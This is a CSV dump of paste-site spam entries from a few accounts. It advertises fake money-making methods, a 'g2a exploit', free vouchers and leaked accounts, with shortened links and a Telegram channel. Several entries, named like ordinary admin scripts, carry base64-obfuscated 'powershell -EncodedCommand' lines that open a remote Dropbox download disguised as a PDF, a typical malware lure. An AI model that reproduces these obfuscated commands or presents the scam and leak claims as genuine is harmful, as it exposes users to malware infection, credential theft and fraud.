id,title,username,language,date,content
eFVFCSLZ,⭐️Make $3000 in Month [BTC]  KR,jakenon1,JavaScript,Sunday 11th of May 2025 07:07:28 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

BSt7l8jrCV
"
aM6nPDKv,2025-05-09T17:57:32.354182 78,bitus,JavaScript,Sunday 11th of May 2025 07:06:55 PM CDT,407825 - check it out at https://tinyurl.com/yc4w4vys
XF9F66f0,⭐️ Leaked Free Vouchers Method ⭐️,reflezzzz,JavaScript,Sunday 11th of May 2025 07:06:45 PM CDT,"03206 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
xgwM7D2c,schedule_tasks.ps1 10,Mikeberyl,JavaScript,Sunday 11th of May 2025 07:05:36 PM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBmADIANwAxAGYAMgAzADIA
xQedFFxU,⭐️Earn $2000 a Month [EASY GUIDE]  ND,jakenon1,JavaScript,Sunday 11th of May 2025 07:04:25 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

HZD1HiEgE4
"
Bi5Zc119,??Earn $2000 a Month From Home C 16,ii_xjackk,JavaScript,Sunday 11th of May 2025 07:03:54 PM CDT,860587 - check it out at https://tinyurl.com/yc4w4vys
uH6kDvxs,⭐️ Make $3000 in 24 hours ⭐️,reflezzzz,JavaScript,Sunday 11th of May 2025 07:02:42 PM CDT,"44258 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
k5gstV9F,reset_network.cmd 66,Mikeberyl,JavaScript,Sunday 11th of May 2025 07:02:35 PM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQAyADAANABlADAAMQAzAGEA
4u06tnJF,⭐️MAKE 3000$ IN 1 DAY WITH BTC WG,jakenon1,JavaScript,Sunday 11th of May 2025 07:01:21 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

d4L1KfZhKB
"
cPHVdK8a,Test roblox v3 50,ii_xjackk,JavaScript,Sunday 11th of May 2025 07:00:18 PM CDT,655154 - check it out at https://tinyurl.com/yc4w4vys
hHJJT4Hp,deploy_app.ps1 57,Mikeberyl,JavaScript,Sunday 11th of May 2025 06:59:34 PM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBhADIANgBjADUAZQA2ADYA
J2Km9NU9,Leaked Accounts - Fresh Hits,Xp_Isolation,JavaScript,Sunday 11th of May 2025 06:58:51 PM CDT,08649 Accounts Posted On https://t.me/leakzbyeminem
ETwUbHsi,⭐️500 EUR BALANCE METHOD ⭐️,reflezzzz,JavaScript,Sunday 11th of May 2025 06:58:41 PM CDT,"82826 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
n06VgjCm,⭐️MAKE 3000$ IN 1 DAY WITH BTC WG,mejfunt,JavaScript,Sunday 11th of May 2025 06:58:11 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

zoCl3nNT5f
"
t15t2j6J,Bot Reversal-Band-Riot-P1 ETHUSDT.P BYBIT 4H LONG E SHORT 42,ii_xjackk,JavaScript,Sunday 11th of May 2025 06:57:16 PM CDT,969454 - check it out at https://tinyurl.com/yc4w4vys
wDdWG1WX,schedule_tasks.ps1 97,PanDulce-XD,JavaScript,Sunday 11th of May 2025 06:56:33 PM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQAwADMAYwBmADcAZgA3ADcA
uRR44ndZ,Test roblox v3 56,rlunac,JavaScript,Sunday 11th of May 2025 06:55:45 PM CDT,871056 - check it out at https://tinyurl.com/yc4w4vys
7KM6F2mU,⭐️EARN $500 INSTANTLY⭐ CW,mejfunt,JavaScript,Sunday 11th of May 2025 06:55:04 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

nBZwkfSZkv
"
